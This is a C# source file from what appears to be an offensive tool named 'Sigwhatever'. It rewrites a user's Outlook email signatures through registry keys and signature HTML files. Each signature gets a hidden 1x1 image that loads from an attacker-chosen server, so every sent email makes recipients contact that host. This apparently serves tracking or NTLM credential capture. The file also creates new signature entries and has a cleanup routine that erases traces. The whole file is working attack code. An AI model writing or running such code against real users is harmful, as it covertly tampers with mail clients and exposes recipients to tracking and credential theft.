using System;
using System.IO;
using System.Linq;
using System.Net;
using Microsoft.Win32;
using System.Net.NetworkInformation;
using HtmlAgilityPack;

namespace Sigwhatever
{
    class ClsModSig
    {
        public string KeyPath(RegistryKey root_path)
        {
            string returnval = "";
            string[] subKeys = root_path.GetSubKeyNames();

            foreach (string subKey in subKeys)
            {
                string fullPath = root_path.Name + "\\" + subKey;
                int firstslash = fullPath.IndexOf('\\') + 1;
                string s = fullPath.Substring(firstslash, fullPath.Length - firstslash);
                RegistryKey profiles = Registry.CurrentUser.OpenSubKey(s);
                string[] profilekeys = profiles.GetSubKeyNames();
                foreach (string pkey in profilekeys)
                {
                    fullPath = profiles.Name + "\\" + pkey;
                    firstslash = fullPath.IndexOf('\\') + 1;
                    s = fullPath.Substring(firstslash, fullPath.Length - firstslash);
                    RegistryKey profilesubkey = Registry.CurrentUser.OpenSubKey(s);
                    string[] profilesubkeys = profilesubkey.GetSubKeyNames();
                    foreach (string l in profilesubkeys)
                    {
                        fullPath = profilesubkey.Name + "\\" + l;
                        firstslash = fullPath.IndexOf('\\') + 1;
                        s = fullPath.Substring(firstslash, fullPath.Length - firstslash);
                        RegistryKey r = Registry.CurrentUser.OpenSubKey(s);
                        string[] values = r.GetValueNames();
                        foreach (string value in values)
                        {
                            if (value == "Identity Eid")
                            {
                                Console.WriteLine("Found User's Signature Path: " + fullPath);
                                returnval = s;
                            }
                        }
                    }
                }
            }
            return returnval;
        }

        public void ModSignature(string server, string urlPrefix, string port, string newsigname, bool cleanup, string existingsigtext)
        {
            string officeversion = "14.0";
            try
            {
                Console.WriteLine("[*] Attempting to make a Word process to find the version number");
                Microsoft.Office.Interop.Word.Application appVersion = new Microsoft.Office.Interop.Word.Application();
                officeversion = appVersion.Version.ToString();
                appVersion.Quit();
            }
            catch (Exception e)
            {
                Console.WriteLine("Error getting office version: " + e.Message);
            }

            string regSiglocation = ReadKey(@"Software\Microsoft\Office\" + officeversion + @"\Common\General", "Signatures");

            //Need to find the actual user's newsig and replysig locations
            RegistryKey regbase = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Office\" + officeversion + @"\Outlook\Profiles");

            string profilebase = KeyPath(regbase);
            string regNewSig = ReadKey(profilebase, "New Signature");
            string regReplySig = ReadKey(profilebase, "Reply-Forward Signature");

            //If they don't exist, create a unique sig name and populate the keys
            //If they exist, make sure we can see the files they reference
            string sigfolder = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Microsoft\" + regSiglocation + @"\";

            try
            {
                Directory.CreateDirectory(sigfolder);
            }
            catch (Exception)
            {

            }

            if (cleanup)
            {
                RemoveAllTraces(sigfolder, profilebase);
            }

            Console.WriteLine($"[*] NewSignature value: {regNewSig}");
            Console.WriteLine($"[*] ReplySignature value: {regReplySig}");
            Console.WriteLine($"[*] Template location: {regSiglocation}");

            string existingdefaultsig = "";
            if (existingsigtext != "")
            {
                Console.WriteLine("[*] Trying to find file with default signature text");
                existingdefaultsig = FindSigFile(existingsigtext, sigfolder);
            }
            if (existingsigtext == "ALL")
            {
                var files = Directory.EnumerateFiles(sigfolder, "*.htm");
                if (files.Count() > 0)
                {
                    existingdefaultsig = existingsigtext;
                }
            }

            Console.WriteLine("[*] Looking for existing signature files in " + sigfolder);

            string htmlNewSig = "";
            string htmlReplySig = "";

            if (regNewSig != "" || regReplySig != "" && existingdefaultsig == "")
            {
                try
                {
                    string fileNewSig = regNewSig + ".htm";
                    Console.WriteLine($"[*] Modding {fileNewSig}");
                    htmlNewSig = File.ReadAllText(sigfolder + fileNewSig);
                    string modhtmlNewSig = "";
                    if (cleanup)
                    {
                        modhtmlNewSig = ModHTML(htmlNewSig, server, urlPrefix, port, true);
                    }
                    else
                    {
                        modhtmlNewSig = ModHTML(htmlNewSig, server, urlPrefix, port, false);
                    }

                    File.WriteAllText(sigfolder + fileNewSig, modhtmlNewSig);

                }
                catch (Exception)
                {

                }
                try
                {
                    string fileReplySig = regReplySig + ".htm";
                    htmlReplySig = File.ReadAllText(sigfolder + fileReplySig);
                    string modhtmlReplySig = "";

                    if (cleanup)
                    {
                        modhtmlReplySig = ModHTML(htmlReplySig, server, urlPrefix, port, true);
                    }
                    else
                    {
                        modhtmlReplySig = ModHTML(htmlReplySig, server, urlPrefix, port, false);
                    }
                    File.WriteAllText(sigfolder + fileReplySig, modhtmlReplySig);
                }
                catch (Exception e)
                {
                    Console.WriteLine(e.Message);
                }
                //At this point, there's at least one existing signature defined and hopefully we've read in the HTML content
            }
            else if (existingdefaultsig != "")
            {
                if (existingdefaultsig == "ALL")
                {

                    var files = Directory.EnumerateFiles(sigfolder, "*.htm");


                    foreach (var file in files)
                    {
                        string stringfiletext = File.ReadAllText(file);
                        if (!stringfiletext.Contains("defaultoutlook"))
                        {
                            Console.WriteLine("[CLEANUP] Adding image to file: " + file + " with link to " + server);

                            string modhtmlNewSig = ModHTML(stringfiletext, server, urlPrefix, port, false);
                            File.WriteAllText(file, modhtmlNewSig);
                        }
                    }
                    return;
                }
                else
                {
                    try
                    {
                        string fileNewSig = existingdefaultsig + ".htm";
                        Console.WriteLine("[+] Modding " + fileNewSig);
                        htmlNewSig = File.ReadAllText(sigfolder + fileNewSig);
                        string modhtmlNewSig = "";
                        if (cleanup)
                        {
                            modhtmlNewSig = ModHTML(htmlNewSig, server, urlPrefix, port, true);
                        }
                        else
                        {
                            modhtmlNewSig = ModHTML(htmlNewSig, server, urlPrefix, port, false);
                        }

                        File.WriteAllText(sigfolder + fileNewSig, modhtmlNewSig);

                    }
                    catch (Exception e)
                    {
                        Console.WriteLine(e.Message);
                    }
                }
            }
            else
            {
                Console.WriteLine("[+] No existing signature settings in the registry or in new emails.");
            }


            //Check if we're cleaning up - if we are then just remove the content and then exit.
            if (cleanup)
            {
                try
                {
                    bool created = false;
                    Console.WriteLine("[+] Removing any reg keys and content for Email signature that we created");
                    if (regNewSig == newsigname)
                    {
                        RemoveValue(@"Software\Microsoft\Office\16.0\Common\MailSettings", "NewSignature");
                        try
                        {
                            RemoveValue(profilebase, "New Signature");
                        }
                        catch (Exception e)
                        {

                        }
                        created = true;
                    }
                    if (regReplySig == newsigname)
                    {
                        RemoveValue(@"Software\Microsoft\Office\16.0\Common\MailSettings", "ReplySignature");
                        try
                        {
                            RemoveValue(profilebase, "Reply-Forward Signature");
                        }
                        catch (Exception e)
                        {

                        }
                        created = true;
                    }

                    File.Delete(sigfolder + newsigname + ".htm");
                    Console.WriteLine("[+] Cleanup done");
                }
                catch (Exception e)
                {
                    Console.WriteLine("Error cleaning up: " + e.Message);
                }
            }

            //If the HTML is set, that means there was already a sig, so we check again whether there's HTML and if there's not, we create the reg key and some HTML
            if (htmlNewSig == "" && existingdefaultsig == "")
            {
                Console.WriteLine("[+] Writing new reg keys and content for New Email signature");
                //createValue(@"Software\Microsoft\Office\16.0\Common\MailSettings", "NewSignature", newsigname);
                CreateValue(profilebase, "New Signature", newsigname);
                string newHtmlsig = MakeNewHTML(server, urlPrefix, port);
                File.WriteAllText(sigfolder + newsigname + ".htm", newHtmlsig);
            }

            if (htmlReplySig == "" && existingdefaultsig == "")
            {
                Console.WriteLine("[+] Writing new reg keys and content for Reply Email signature");
                //createValue(@"Software\Microsoft\Office\16.0\Common\MailSettings", "ReplySignature", newsigname);
                CreateValue(profilebase, "Reply-Forward Signature", newsigname);
                string newHtmlsig = MakeNewHTML(server, urlPrefix, port);
                File.WriteAllText(sigfolder + newsigname + ".htm", newHtmlsig);
            }
        }

        private string FindSigFile(string existingtext, string dir)
        {
            var files = Directory.EnumerateFiles(dir, "*.txt");
            string[] existingtextpart = existingtext.Split('\r');

            foreach (var file in files)
            {
                string[] filetext = File.ReadAllText(file).Split('\r');
                if (filetext[0].Contains(existingtextpart[0]))
                {
                    Console.WriteLine("[+] Found existing sig file: " + file);
                    return Path.GetFileNameWithoutExtension(file);
                }
            }
            return "";
        }
        public string GetFQDN()
        {
            string hostName = "";
            try
            {
                string domainName = IPGlobalProperties.GetIPGlobalProperties().DomainName;
                hostName = Dns.GetHostName();
                if (domainName.Length > 2)
                {
                    domainName = "." + domainName;
                    if (!hostName.EndsWith(domainName))  // if hostname does not already include domain name
                    {
                        hostName += domainName;   // add the domain name part
                    }
                }
            }
            catch (Exception)
            {
                hostName = Environment.MachineName;
            }
            return hostName; // return the fully qualified name
        }

        public string MakeNewHTML(string server, string urlPrefix, string port)
        {
            HtmlDocument doc = new HtmlDocument();
            var node = HtmlNode.CreateNode("<html><head></head><body></body></html>");
            doc.DocumentNode.AppendChild(node);
            doc = AddImgLink(doc, server, urlPrefix, port);
            string rethtml = doc.DocumentNode.InnerHtml;
            return rethtml;
        }

        private static HtmlDocument AddImgLink(HtmlDocument doc, string server, string urlPrefix, string port)
        {
            string path = String.IsNullOrEmpty(urlPrefix) ? "default.png" : $"{urlPrefix}/default.png";
            HtmlNode bug = doc.CreateElement("img");
            HtmlAttribute height = doc.CreateAttribute("height", "1");
            HtmlAttribute width = doc.CreateAttribute("width", "1");
            HtmlAttribute alt = doc.CreateAttribute("alt", "defaultoutlook");
            HtmlAttribute href = doc.CreateAttribute("src", $"http://{server}:{port}/{path}");

            if (port == "80")
            {
                href = doc.CreateAttribute("src", $"http://{server}/{path}");
            }
            else if (port == "443")
            {
                href = doc.CreateAttribute("src", $"https://{server}/{path}");
            }

            bug.Attributes.Add(height);
            bug.Attributes.Add(href);
            bug.Attributes.Add(width);
            bug.Attributes.Add(alt);

            HtmlNode body = doc.DocumentNode.SelectSingleNode("//body");
            body.AppendChild(bug);
            return doc;
        }


        private static string ModHTML(string html, string server, string urlPrefix, string port, bool remove)
        {
            HtmlDocument doc = new HtmlDocument();
            doc.LoadHtml(html);
            string rethtml = doc.DocumentNode.InnerHtml;
            bool present = false;
            //Check whether the bad IMG has already been added - remove it if the remove flag is set
            try
            {
                doc.DocumentNode.SelectNodes("//img");
                foreach (HtmlNode linknode in doc.DocumentNode.SelectNodes("//img"))
                {
                    try
                    {
                        HtmlAttribute attribute = linknode.Attributes["alt"];
                        if (attribute.Value == "defaultoutlook")
                        {
                            present = true;
                            if (remove)
                            {
                                Console.WriteLine("[+] Removing IMG tag from html");
                                doc.DocumentNode.SelectSingleNode(linknode.XPath).Remove();
                                return doc.DocumentNode.InnerHtml;
                            }
                        }
                    }
                    catch (Exception)
                    {

                    }
                }
            }
            catch (Exception)
            {

            }

            if (!present)
            {
                doc = AddImgLink(doc, server, urlPrefix, port);
                rethtml = doc.DocumentNode.InnerHtml;
            }
            return rethtml;
        }


        public void RemoveAllTraces(string dir, string profilebase)
        {
            var files = Directory.EnumerateFiles(dir, "*.htm");
            foreach (var file in files)
            {
                string stringfiletext = File.ReadAllText(file);
                if (stringfiletext.Contains("defaultoutlook"))
                {
                    //Console.WriteLine("Removing IMG tag from file: " + file);
                    string modhtmlNewSig = ModHTML(stringfiletext, "", "", "", true);
                    File.WriteAllText(file, modhtmlNewSig);
                }
            }
            return;
        }


        private static void CreateValue(string inkey, string regString, string value)
        {
            try
            {
                RegistryKey key = Registry.CurrentUser.OpenSubKey(inkey, true);
                key.SetValue(regString, value, RegistryValueKind.String);
            }
            catch (Exception e)
            {
                Console.WriteLine("[ERROR] Error creating reg value: " + e.Message);
            }
        }

        private static void RemoveValue(string inkey, string regString)
        {
            try
            {
                RegistryKey key = Registry.CurrentUser.OpenSubKey(inkey, true);
                key.DeleteValue(regString);
            }
            catch (Exception e)
            {
                Console.WriteLine("[ERROR] Error removing reg value: " + e.Message);
            }
        }

        private static string ReadKey(string inkey, string value)
        {
            string retvalue = "";
            try
            {
                RegistryKey key = Registry.CurrentUser.OpenSubKey(inkey);
                if (key != null)
                {
                    Object o = key.GetValue(value);
                    if (o != null)
                    {
                        retvalue = o as string;
                    }
                }
            }
            catch (Exception)
            { }
            return retvalue;
        }
    }
}
